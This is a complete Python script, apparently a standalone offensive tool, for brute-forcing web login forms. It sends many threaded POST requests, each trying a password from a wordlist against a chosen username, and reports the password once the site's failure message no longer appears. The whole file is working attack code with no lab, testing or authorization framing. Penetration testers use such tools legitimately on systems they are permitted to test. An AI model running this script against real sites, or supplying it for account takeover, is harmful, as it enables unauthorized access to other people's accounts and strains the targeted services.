#!/usr/bin/env python3


import requests
import argparse
import time
import os
from concurrent.futures import ThreadPoolExecutor

class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    green='\033[32m'
    pink= '\033[95m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def get_arguments():
    parser = argparse.ArgumentParser(description='Brute Force Login Forms')
    parser.add_argument('-u', dest='url',
                        help='The url to bruteforce', required=True)
    parser.add_argument('-t', dest='threads',
                        help='No of threads', required=True)
    parser.add_argument('-w', dest='wordlist',
                        help='The wordlist for password', required=True)
    parser.add_argument('-l', dest='username',
                        help='The username to login', required=True)
    parser.add_argument('-uf', dest='login',
                        help='The element_id for username', required=True)
    parser.add_argument('-up', dest='password',
                        help='The element_id for password', required=True)
    # parser.add_argument('-d', dest='data',
    #                     help='Any other data to send with the login form', required=False)
    parser.add_argument('-f', dest='failed',
                        help='Message displayed when login fails', required=True)
    args = parser.parse_args()
    return args



def brute(line):
    
    word = line.strip()
    send = {login: username, password: word}
    r = requests.post(url, data=send, allow_redirects=True)
    response = r.text
    # print(response)
    if failed not in response:
        print('\n\n[+] Password Found -> ',bcolors.FAIL +username, bcolors.ENDC + ':', bcolors.pink + word, bcolors.ENDC, '\n')
        end = time.time()
        taken = (end - start)
        print('Time taken:' , int(taken), 'seconds')
        print('')
        os.kill(os.getpid(), 9,)   
        
def banner():
    print(f'''{bcolors.CYAN}
.__       .__  __            ___.                 __          
|__| ____ |__|/  |_          \_ |_________ __ ___/  |_  ____  
|  |/    \|  \   __\  ______  | __ \_  __ \  |  \   __\/ __ \ 
|  |   |  \  ||  |   /_____/  | \_\ \  | \/  |  /|  | \  ___/ 
|__|___|  /__||__|            |___  /__|  |____/ |__|  \___  >
        \/                        \/                       \/ 

                                            {bcolors.green}by init__6{bcolors.ENDC}
          
          ''')

def main():
    
    f = open(wordlist, 'r')
    processes = []
    with ThreadPoolExecutor(max_workers=(threads)) as executor:
        for line in f.readlines():
            processes.append(executor.submit(brute, line))
    

    print('\n[-] The password for the user', username, 'is not in the wordlist you provided')

banner()
start = time.time()
args = get_arguments()
url = args.url
threads = int(args.threads)
wordlist = args.wordlist
username = args.username
login = args.login
password = args.password
failed = str(args.failed)

try:
    main()
except KeyboardInterrupt:
    os.kill(os.getpid(), 9,) 

    
